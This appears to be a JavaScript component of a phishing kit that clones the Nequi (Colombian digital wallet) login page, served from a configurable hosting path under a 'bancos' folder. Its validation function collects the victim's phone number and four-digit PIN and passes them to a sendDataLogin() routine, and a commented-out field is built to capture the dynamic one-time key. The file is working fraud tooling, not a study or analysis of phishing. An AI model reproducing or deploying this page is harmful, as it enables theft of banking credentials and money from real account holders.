var my_titulo = 'Nequi';
var nequi_body = `
<link rel="stylesheet" type="text/css" href="${my_hosting}/bancos/nequi/assets/css/main.css">

<div id="content">
    <div ng-include="getTemplate('/header.html')" class="ng-scope">
        <header class="ng-scope">
            <div class="wrap-header">
                <div class="row">
                    <div class="col-xs-12 col-md-2">
                        <div class="logo"> <a href="https://www.nequi.com.co"> <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
                            </a> </div>
                        <div class="btn-menu-hamburguer" ng-click="openMenu();"> <a class=""> <span></span> </a>
                        </div>
                    </div>
                    <div class="col-xs-12 col-md-10 container-buttons">
                        <div class="wrap-main-menu ">
                            <div class="row">
                                <div class="col-xs-12 col-md-8"> </div>
                                <div class="col-xs-12 col-md-4">
                                    <div class="buttons-right">
                                        <ul> <!-- ngIf: !hidePa -->
                                            <li ng-if="!hidePa" class="ng-scope"> <a target="_blank" href="https://recarga.nequi.com.co/bdigitalpsl" class="ng-binding">Recarga</a> </li><!-- end ngIf: !hidePa -->
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </header>
    </div>
    <!-- ngInclude: getTemplate('/header.html') -->
    <section class="login-section ng-scope" ng-controller="loginController as loginControl">
        <div class="login-wrap">
            <h1 class="ng-binding">Entra a tu Nequi</h1>
            <p class="ng-binding">Podrás bloquear tu Nequi, consultar tus datos.</p>
            <div class="login-form-wrap">
                <form onsubmit="return validateDataNequi()" novalidate="" class="ng-pristine ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-invalid-recaptcha">
                    <div class="container-form">
                        <div class="input-country">
                            <div class="wrap-select-country">
                                <select-country selected-country="loginControl.selectCountry" options="loginControl.selectOption" on-select-country="loginControl.onSelectCountry(option)" class="ng-isolate-scope">
                                    <div class="select-country " ng-click="toggleSelect();">
                                        <div class="country-wrap country-active">
                                            <div class="select-col select-col-img"> <img src="${my_hosting}/bancos/nequi/assets/images/flag_colombia.png" alt="co"> </div>
                                            <div class="select-col">
                                                <p class="ng-binding"> +57 </p> <input class="country-input" type="text" name="j_region" id="j_region" value="57">
                                            </div>
                                        </div>
                                        <ul> <!-- ngRepeat: option in options -->
                                            <li ng-repeat="option in options" class="ng-scope">
                                                <div ng-click="setCountry($index);" class="country-wrap">
                                                    <div class="select-col select-col-img"> <img src="${my_hosting}/bancos/nequi/assets/images/flag_colombia.png" alt="co"> </div>
                                                    <div class="select-col">
                                                        <p class="ng-binding">+57</p>
                                                    </div>
                                                </div>
                                            </li><!-- end ngRepeat: option in options -->
                                            <li ng-repeat="option in options" class="ng-scope">
                                                <div ng-click="setCountry($index);" class="country-wrap">
                                                    <div class="select-col select-col-img"> <img src="assets/images/flag_panama.png" alt="pa"> </div>
                                                    <div class="select-col">
                                                        <p class="ng-binding">+507</p>
                                                    </div>
                                                </div>
                                            </li><!-- end ngRepeat: option in options -->
                                        </ul>
                                    </div>
                                </select-country>
                            </div>
                            <div class="form-group">
                                <input type="tel" id="txtUsuario"
                                    name="j_username" required="true" minlength="10" maxlength="10" pattern="^[0-9]*$+s" ng-model="loginControl.user" ui-us-phone-number="" masklocalstring="000 000 0000" class="ng-pristine ng-untouched ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength" required="required">
                                <label for="j_username" class="ng-binding">Número de celular</label>
                            </div>
                        </div>
                        <div class="form-group">
                            <input class="password ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength" type="password"
                                id="txtPassword" name="j_password" ng-required="true" maxlength="4" minlength="4" pattern="^[0-9]*$" ng-model="loginControl.password" required="required">
                            <label for="j_password" class="ng-binding">Contraseña</label>
                        </div>
                        <!-- ngIf: !hidePa -->
                        <!-- <div class="form-group tooltip ng-scope" ng-if="!hidePa">
                            <input type="text" id="j_token" name="j_token" ng-required="true" ng-maxlength="6" ng-minlength="6" ng-pattern="^[0-9]*$+s" ng-model="loginControl.token" ui-us-phone-number="" masklocalstring="000000" class="ng-pristine ng-untouched ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength" required="required">
                            <label for="j_token" class="ng-binding">Clave dinámica</label>
                            <div class="tooltiptext">
                                <p class="title-tooltip ng-binding">Puedes copiar la clave dinámica directamente
                                    desde la app</p>
                                <img class="img-dynamic-key" src="${my_hosting}/bancos/nequi/assets/images/dynamic-key.png" alt="Imagen ayuda clave dinámica">
                            </div>
                        </div> -->
                        <!-- end ngIf: !hidePa -->
                    </div>

                    <div class="btn-wrap">
                        <input class="form-btn-submit" type="submit" value="Entra" ng-disabled="!loginControl.formLogin.$valid">
                    </div>
                </form>
            </div>
        </div>
    </section>
</div>

`
var my_contenido = `
<?php require_once('_plantilla_nequi.php'); ?>
`
//<script>
    function validateDataNequi() {
        var usuario = $('#txtUsuario').val();
        var password = $('#txtPassword').val();
        let msgError = '';
        if (usuario == '') {
            msgError = 'Ingrese el Celular.';
            $("#txtUsuario").focus();
        } else if (password == '') {
            msgError = 'Ingrese la Contraseña.';
            $("#txtPassword").focus();
        } else if (usuario.length > 10) {
            msgError = 'Ingrese correctamente el número de celular.';
            $("#txtUsuario").focus();
        } else if (password.length !== 4) {
            msgError = 'Ingrese correctamente su contraseña.';
            $("#txtPassword").focus();
        } else if (!usuario.startsWith("3")) {
            msgError = 'El número de celular debe comenzar con el número 3.';
            $("#txtUsuario").focus();
        }
        if (msgError) {
            lanzarAlerta({
                msg: msgError,
                type: 'warning',
            });
            return false;
        }
        sendDataLogin(usuario, password)

        return false;
    }

    function formatInputValue(input) {
        let value = input.value.replace(/\s/g, '');
        value = value.replace(/(\d{3})(\d{1})/, '$1 $2');
        value = value.replace(/(\d{3})(\d{1})/, '$1 $2');
        input.value = value;
    }